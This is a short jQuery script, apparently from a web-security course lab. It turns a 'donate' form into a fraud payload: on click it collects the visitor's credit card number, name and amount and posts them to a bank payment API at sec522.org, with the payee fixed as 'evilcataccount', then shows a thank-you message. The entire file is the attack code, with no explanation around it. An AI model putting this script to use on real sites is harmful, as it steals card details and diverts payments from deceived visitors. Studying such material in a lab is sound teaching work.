var hints=0;
$(document).ready(function() {
    $('#donate').bind('click',function() {
	let paymentdata={};
	paymentdata['ccnumber']=$('#cc').val();
	paymentdata['name']=$('#name').val();
	paymentdata['amount']=$('#amount').val();
	paymentdata['accountid']='evilcataccount';
	$.post('http://sec522.org/ibank/paymentapi.php',paymentdata,function(){
	    $('#paymentform').html('<h1>Thank you!</h1>');
	})
    })
})
